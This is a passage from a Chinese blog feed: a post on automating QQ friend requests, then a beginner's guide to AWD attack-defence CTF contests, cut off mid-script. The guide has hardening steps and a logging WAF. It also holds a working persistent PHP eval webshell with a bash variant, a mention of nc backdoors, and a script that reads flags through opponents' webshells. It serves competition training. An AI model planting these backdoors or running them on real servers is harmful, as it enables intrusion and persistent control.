    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>出于<del>营销</del>(误:P的原因，需要添加一些好友，手动复制 QQ 号搜索，添加，每次需要至少二三十分钟。于是有了编写自动化添加好友的想法。需求如下:</p><ol><li>自定义验证问题回答（必须），自定义备注，自定义加入分组（可选）</li><li>添加结果，失败，成功（可选）</li></ol><a id="more"></a><h2 id="0x01-分析分析"><a href="#0x01-分析分析" class="headerlink" title="0x01 分析分析"></a>0x01 分析分析</h2><p>很自然想到调用第三方接口实现，上网查了一下 qqbot 倒是可以实现，不幸的是 qqbot 基于 smartQQ，正好于 19 年 1 月 3 日下线了，QAQ</p><p>没办法，咨询了下万能的淘宝，发现类似的营销软件都是通过操作 QQ 页面的方式实现，可以参考:<a href="http://houtai.100public.com/video/GetVideoList.php?softid=qqqunfa&brandname=qq%E7%BE%A4%E5%8F%91" target="_blank" rel="noopener">使用教程视频集</a>，因为需要设置分辨率，分析可能是使用类似按键精灵，定位图像制作，起初感觉不是很优雅</p><p>朋友推荐一款叫做 酷安机器人 的工具，是一款腾讯授权的第三方 api 接口，可以自定义编写程序，论坛也有现成的可更改的添加好友程序，不过这款软件开始收费了，迫于贫穷作罢</p><p>思考和分析后，总结出三种实现方式:</p><ol><li>按键精灵类效果，控制鼠标和键盘完成</li><li>调用第三方 api，方便快捷</li><li>控制 win32 程序实现自动操作</li></ol><p>第一种方式实现原理很简单，但还要去学习相关按键精灵知识，也不是很喜欢这种方式，作为备选。第二种是我最青睐的方式，不过 qqbot 已挂，也买不起付费 api，加之 tx 对此监管也很严格，只能作罢，当然仅限于 pc 端，其他方式没有了解。</p><p>那就退而求其次，控制 win32 窗口的方式实现，查找了一下，python 模块 pywinauto 可以实现编写 txt，excel 实现办公自动化，但是由于 QQ 的防修改措施，无法获取到 QQ 的句柄信息，不能进行精确操作。</p><p>最后选择了 pyautogui + pywinauto 混合控制 win32 程序和图像识别的方式实现，最后还是折中了ｍ（＿ ＿；；ｍ</p><h2 id="0x02-开始码代码"><a href="#0x02-开始码代码" class="headerlink" title="0x02 开始码代码"></a>0x02 开始码代码</h2><p>搜索好友这里选用了两种方法:</p><ol><li>通过 QQ 添加好友窗口查找添加</li><li>接口方式，<code>tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=10000&amp;website=bbs.125.la</code></li></ol><p>第二种虽然快捷，但是容易失效，虽然发送了请求，但却显示没有发送</p><p>核心逻辑</p><p><img src="/2019/03/22/Python_03/20190322133303.png" alt></p><p>运行效果</p><p><img src="/2019/03/22/Python_03/20190322134019.png" alt></p><h2 id="0x03-总结思考"><a href="#0x03-总结思考" class="headerlink" title="0x03 总结思考"></a>0x03 总结思考</h2><p>完成了没有无验证问题下好友自动添加，实际测试下添加一个好友大概需要20秒左右，其余情况也可以自动化解决，考虑到添加好友平均时间问题以及图像识别速度，就没有继续完善下去了，期待更好的解决方法</p><p>pyautogui 自动添加 QQ 好友 - <a href="https://github.com/j785786058/add_qq_friends" target="_blank" rel="noopener">https://github.com/j785786058/add_qq_friends</a></p><p>pyautogui 坑点 - <a href="https://blog.csdn.net/yaoliuwei1426/article/details/87933205" target="_blank" rel="noopener">https://blog.csdn.net/yaoliuwei1426/article/details/87933205</a></p><p>win32 自动发送信息 - <a href="https://blog.csdn.net/wjb123sw99/article/details/83475516" target="_blank" rel="noopener">https://blog.csdn.net/wjb123sw99/article/details/83475516</a></p><p>win32 自动登录 QQ - <a href="https://blog.csdn.net/qq_42022255/article/details/80659848" target="_blank" rel="noopener">https://blog.csdn.net/qq_42022255/article/details/80659848</a></p><p>pywinauto 简明教程 - <a href="https://gaianote.github.io/2018/06/13/pywinauto%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">https://gaianote.github.io/2018/06/13/pywinauto%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/</a></p><p>pywinauto 教学 - <a href="https://blog.csdn.net/shawpan/article/details/78170117" target="_blank" rel="noopener">https://blog.csdn.net/shawpan/article/details/78170117</a></p><p>pyinstaller 简明教程 - <a href="http://legendtkl.com/2015/11/06/pyinstaller/" target="_blank" rel="noopener">http://legendtkl.com/2015/11/06/pyinstaller/</a></p><p>pyinstaller 详解 - <a href="https://yujunjiex.gitee.io/2018/10/18/PyInstaller%E6%89%93%E5%8C%85%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">https://yujunjiex.gitee.io/2018/10/18/PyInstaller%E6%89%93%E5%8C%85%E8%AF%A6%E8%A7%A3/</a></p><p>pyinstaller 打包 opencv 错误 - <a href="https://blog.csdn.net/zx520113/article/details/82793312" target="_blank" rel="noopener">https://blog.csdn.net/zx520113/article/details/82793312</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;0X00 前言&lt;/h2&gt;&lt;p&gt;出于&lt;del&gt;营销&lt;/del&gt;(误:P的原因，需要添加一些好友，手动复制 QQ 号搜索，添加，每次需要至少二三十分钟。于是有了编写自动化添加好友的想法。需求如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自定义验证问题回答（必须），自定义备注，自定义加入分组（可选）&lt;/li&gt;
&lt;li&gt;添加结果，失败，成功（可选）&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
    
      <category term="Code" scheme="https://jlkl.github.io/tags/Code/"/>
    
      <category term="Python" scheme="https://jlkl.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下赛AWD新手入门Web篇</title>
    <link href="https://jlkl.github.io/2019/02/08/Web_13/"/>
    <id>https://jlkl.github.io/2019/02/08/Web_13/</id>
    <published>2019-02-08T06:36:35.000Z</published>
    <updated>2019-02-08T06:42:20.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>安洵杯线下一脸懵逼，西石油线下毫无悬念被打爆，于是有了整理实践线下文章资料的念头，同时也感谢 DOg3@Ph0rse 的分享。萌新文章，大佬们可以不用care了。</p><h2 id="0x01-关于线下"><a href="#0x01-关于线下" class="headerlink" title="0x01 关于线下"></a>0x01 关于线下</h2><ol><li><p>AWD模式：Attack With Defence，攻击中防御，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p></li><li><p>高地模式：每只队伍服务器可以访问，没有权限，需要自己去获取权限。同时存在高地服务器，不属于任何一支队伍，每只队伍竞争高地服务器权限。</p></li><li><p>域渗透：Windows AD 域环境，更贴近实战</p></li></ol><p>更加详细可参见：<a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense</a></p><a id="more"></a><h2 id="0X02-环境搭建"><a href="#0X02-环境搭建" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h2><p>AWD 线下赛个人觉得主要靠平时的积累和脚本的编写，引用彭哥的话来说，没经验打不过别人导致得不到锻炼就造成了恶性循环，所以平时能自己搭建环境训练是很有必要的。</p><p>这里选用一套开源的框架，采用docker，内含多个环境及环境对应 write up，也可以自己搭建，框架有一点小毛病，但并不影响使用。</p><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="noopener">https://github.com/zhl2008/awd-platform</a></p><p>简要步骤（详细可查看手册）：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 下载github项目</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/zhl2008/awd-platform.git</span><br><span class="line"><span class="comment">## 下载镜像，并改名</span></span><br><span class="line">docker pull zhl2008/web_14.<span class="number">04</span></span><br><span class="line">docker <span class="keyword">tag</span> <span class="title">zhl2008</span>/web_14.<span class="number">04</span> web_14.<span class="number">04</span></span><br><span class="line"><span class="comment">## 建立队伍floder</span></span><br><span class="line">python batch.py web_dir team_number</span><br><span class="line"><span class="comment">## 启动比赛</span></span><br><span class="line">python <span class="literal">start</span>.py ./ team_number</span><br><span class="line">    for example: python <span class="literal">start</span>.py ./ <span class="number">5</span></span><br><span class="line"><span class="comment">## 启动check脚本</span></span><br><span class="line">docker exec check_server</span><br><span class="line">python check.py</span><br></pre></td></tr></table></figure><p>这里开启了4个队伍，Web 服务对应 8801，8802，8803，8804 端口</p><p><img src="/2019/02/08/Web_13/20190206162649.png" alt></p><h2 id="0X03-Attack-With-Defence"><a href="#0X03-Attack-With-Defence" class="headerlink" title="0X03 Attack With Defence"></a>0X03 Attack With Defence</h2><h3 id="1-修改ssh密码"><a href="#1-修改ssh密码" class="headerlink" title="1. 修改ssh密码"></a>1. 修改ssh密码</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span> username</span><br><span class="line"><span class="comment"># 输入密码确认即可</span></span><br></pre></td></tr></table></figure><h3 id="2-修改数据库密码及备份数据库（以-mysql-为例）"><a href="#2-修改数据库密码及备份数据库（以-mysql-为例）" class="headerlink" title="2. 修改数据库密码及备份数据库（以 mysql 为例）"></a>2. 修改数据库密码及备份数据库（以 mysql 为例）</h3><p>修改 mysql 密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'new password'</span>);</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">2.</span> 修改 mysql <span class="keyword">user</span> 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;<span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'new password'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">3.</span> 使用 <span class="keyword">GRANT</span> 语句</span><br><span class="line">mysql&gt;<span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'127.0.0.1'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'new password'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line">mysql&gt;flush <span class="keyword">privileges</span>;</span><br><span class="line"><span class="number">4.</span> mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root <span class="keyword">password</span> "new password";（注意双引号或不加）</span><br></pre></td></tr></table></figure><p>备份指定的多个数据库</p><p><code>[root@ubuntu]# mysqldump -u root -p --databases databasesname &gt; /tmp/db.sql</code></p><p>数据库恢复，在mysql终端下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令格式：source FILE_PATH</span></span><br><span class="line"><span class="built_in">source</span> ~/db.sql（原数据库需存在）</span><br></pre></td></tr></table></figure><p>比赛前一定要快速修改密码和备份，否则密码被别人更改需要重置环境就尴尬了，修改数据库密码后注意修改源码配置文件，避免服务崩溃。同时赛前也可以准备些例如 phpmyadmin 的批量爆破和改密的脚本。</p><h3 id="3-源码备份"><a href="#3-源码备份" class="headerlink" title="3. 源码备份"></a>3. 源码备份</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 打包目录</span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zcvf</span> <span class="selector-tag">archive_name</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span> <span class="selector-tag">directory_to_compress</span></span><br><span class="line"># 解包</span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">archive_name</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure><p>之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码</p><h3 id="4-上-WAF"><a href="#4-上-WAF" class="headerlink" title="4. 上 WAF"></a>4. 上 WAF</h3><p>备份好源码之后要做的就是监控访问，截取攻击向量，做好流量重放的准备。一般的 WAF 只需要做到记录访问的基本信息如时间，ip，get，post，cookie，UA即可。也可以自行编写通防 WAF，功能如关键字检测，截取上传文件内容等。</p><p>但一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题。</p><p>可以使用 bash 命令在每一个 php 文件前面加上 <code>require_once</code> 包含 WAF 文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 批量加waf <span class="regexp">/var/</span>www<span class="regexp">/html/</span> 目录下每个 php 文件前加上 &lt;?php require_once <span class="string">"/tmp/waf.php"</span>;?&gt;</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/var/</span>www<span class="regexp">/html/</span> -path <span class="regexp">/var/</span>www<span class="regexp">/html/</span><span class="number">124687</span>a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name <span class="string">'*.php'</span>|xargs  sed -i <span class="string">'1i&lt;?php require_once "/tmp/waf.php";?&gt;'</span></span><br></pre></td></tr></table></figure><p>也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Automatically <span class="built_in">add</span> <span class="built_in">files</span> <span class="keyword">before</span> PHP document.</span><br><span class="line">; <span class="keyword">http</span>://php.net/auto-prepend-<span class="built_in">file</span></span><br><span class="line">auto_prepend_file = /tmp/waf.php</span><br></pre></td></tr></table></figure><p>附上郁离歌的一枚 WAF，会在 <code>/tmp/loooooooogs</code> 目录下生成日志文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">define(<span class="string">'LOG_FILEDIR'</span>,<span class="string">'/tmp/loooooooogs'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!is_dir(LOG_FILEDIR))&#123;</span></span><br><span class="line"><span class="php">mkdir(LOG_FILEDIR);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) &#123; </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>&#123; </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) &#123; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>) </span></span><br><span class="line"><span class="php">$headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>)))))] = $value;</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">return</span> $headers; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php">$get = $_GET; </span></span><br><span class="line"><span class="php">$post = $_POST; </span></span><br><span class="line"><span class="php">$cookie = $_COOKIE; </span></span><br><span class="line"><span class="php">$header = getallheaders(); </span></span><br><span class="line"><span class="php">$files = $_FILES; </span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; </span></span><br><span class="line"><span class="php">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>]; </span></span><br><span class="line"><span class="php">$filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123; </span></span><br><span class="line"><span class="php">$files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]); </span></span><br><span class="line"><span class="php">file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"virink"</span>); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]);</span></span><br><span class="line"><span class="php">$input = <span class="keyword">array</span>(<span class="string">"Get"</span>=&gt;$get, <span class="string">"Post"</span>=&gt;$post, <span class="string">"Cookie"</span>=&gt;$cookie, <span class="string">"File"</span>=&gt;$files, <span class="string">"Header"</span>=&gt;$header);</span></span><br><span class="line"></span><br><span class="line"><span class="php">logging($input);</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span></span>&#123; </span></span><br><span class="line"><span class="php">$filename = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span></span><br><span class="line"><span class="php">$LOG_FILENAME = LOG_FILEDIR.<span class="string">"/"</span>.$filename;</span></span><br><span class="line"><span class="php">$time = date(<span class="string">"Y-m-d G:i:s"</span>);</span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME, <span class="string">"\r\n"</span>.$time.<span class="string">"\r\n"</span>.print_r($var, <span class="keyword">true</span>), FILE_APPEND); </span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME,<span class="string">"\r\n"</span>.<span class="string">'http://'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].<span class="string">'?'</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>], FILE_APPEND);</span></span><br><span class="line"><span class="php">file_put_contents($LOG_FILENAME,<span class="string">"\r\n***************************************************************"</span>,FILE_APPEND);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">waf(); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。</p><h3 id="5-文件监控"><a href="#5-文件监控" class="headerlink" title="5. 文件监控"></a>5. 文件监控</h3><p>网上有很多文件监控的脚本，也可以使用 bash 命令自行查找出例如10分钟内修改过的 php 文件，这里推荐一个师傅的文件监控工具，文件相关操作都清晰明了。</p><p><a href="https://github.com/TheKingOfDuck/FileMonitor" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/FileMonitor</a></p><p><img src="/2019/02/08/Web_13/20190207165325.png" alt></p><p>线下环境一般不能访问外网，所以需要提前下载好脚本和相关依赖，这个工具需要 <code>watchdog</code> 依赖，也是要提前准备的。</p><p>使用 <code>touch</code> 命令修改文件时间戳可以一定程度防范对文件的检测。</p><h3 id="6-权限维持——不死马"><a href="#6-权限维持——不死马" class="headerlink" title="6. 权限维持——不死马"></a>6. 权限维持——不死马</h3><p>不死马也称内存马，删除掉木马之后，由于操作存于内存当中，还是会不断地生成木马，达到权限维持的目的。</p><h4 id="6-1-不死马使用"><a href="#6-1-不死马使用" class="headerlink" title="6.1. 不死马使用"></a>6.1. 不死马使用</h4><p>常规不死马，先删除自身，不断生成 <code>.index.php</code> 文件</p><p><img src="/2019/02/08/Web_13/20190207172500.png" alt></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ignore_user_abort(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">unlink(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$file = <span class="string">'./.index.php'</span>;</span></span><br><span class="line"><span class="php">$code = <span class="string">'&lt;?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&amp;a=command</span></span></span><br><span class="line"><span class="php"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">file_put_contents($file,$code);</span></span><br><span class="line"><span class="php">usleep(<span class="number">5000</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里添加了一个密码 <code>pass</code> 防止别人借刀杀人，我们平时也可以编写自己的木马，别人就算拿到木马也不知道怎么利用，附上一句话木马的各种变形</p><p><a href="http://www.secist.com/archives/1947.html" target="_blank" rel="noopener">http://www.secist.com/archives/1947.html</a></p><p>bash 命令不死马，效果也是不断生成 <code>.index.php</code> 文件，也可以使用命令不断创建 nc 后门</p><p><code>system(&#39;while true;do echo \&#39;&lt;?php if(md5($_GET[pass])==\&quot;3a50065e1709acc47ba0c9238294364f\&quot;){@eval($_GET[a]);} ?&gt;\&#39; &gt;fuck.php;sleep 0.1;done;&#39;);</code></p><h4 id="6-2-不死马的克制"><a href="#6-2-不死马的克制" class="headerlink" title="6.2. 不死马的克制"></a>6.2. 不死马的克制</h4><ol><li>杀掉不死马运行的进程，直接删除脚本没用，因为php执行的时候已经把脚本读进去解释成opcode运行了</li></ol><p><code>ps aux</code> 查看运行的进程</p><p><img src="/2019/02/08/Web_13/20190207173536.png" alt></p><p>www-data 权限运行了 4 个 apache 进程，不死马随机运行于这 4 个进程，直接 <code>kill pid</code> （www-data 权限下）全部杀掉这几个进程就可以了</p><p>可以使用 <code>kill -9 -1</code> 杀死当前用户所有进程（有权限下慎用），也可以直接 <code>killall apache2</code> 杀掉 apache 所有子进程</p><ol start="2"><li>重启 apache，php 等web服务（一般不会有权限）</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br><span class="line">service php restart</span><br></pre></td></tr></table></figure><ol start="3"><li><p>用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值</p></li><li><p>创建一个和不死马生成的马一样名字的文件夹，测试了下需要先删除再创建文件夹</p></li></ol><h3 id="7-自动提交"><a href="#7-自动提交" class="headerlink" title="7. 自动提交"></a>7. 自动提交</h3><p>比赛中提交 flag 一般会带上队伍 token 和 flag，格式如下：</p><p><code>flag.php?token=teamtoken&amp;flag=this_is_flag</code></p><p>获取 flag 一般有两种方式：</p><ol><li>flag 在根目录，直接 <code>cat</code> 读取 flag</li><li>在对方机器请求指定地址（curl）获取 flag</li></ol><p>flag 每几分钟更换一轮，手动提交显然是不太可能的，需要提前准备自动获取，提交 flag 的脚本，并根据实际情况进行修改</p><p>下面这个脚本每两分钟获取一次 flag 并自动提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ip:"</span></span><br><span class="line">url1 = <span class="string">""</span></span><br><span class="line">shell = <span class="string">"/includes/config.php?d=system"</span></span><br><span class="line">passwd = <span class="string">"c"</span> </span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line">payload = &#123;passwd: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line"></span><br><span class="line">flag_server = <span class="string">"http://flag_server/flag_file.php?token=%s&amp;flag=%s"</span></span><br><span class="line">teamtoken = <span class="string">"team1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span><span class="params">(target, teamtoken, flag)</span>:</span></span><br><span class="line">    url = flag_server % (teamtoken, flag)</span><br><span class="line">    pos = &#123;&#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]Submitting flag:%s:%s"</span> % (target, url)</span><br><span class="line">    response = requests.post(url, data=pos)</span><br><span class="line">    content = response.text</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]content:%s"</span> % content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+]Success!!"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-]Failed"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </span><br><span class="line">    f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">8802</span>,<span class="number">8803</span>,<span class="number">8804</span>]: </span><br><span class="line">        url1=url+str(i)+shell</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"------------------------------------"</span></span><br><span class="line">            res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">            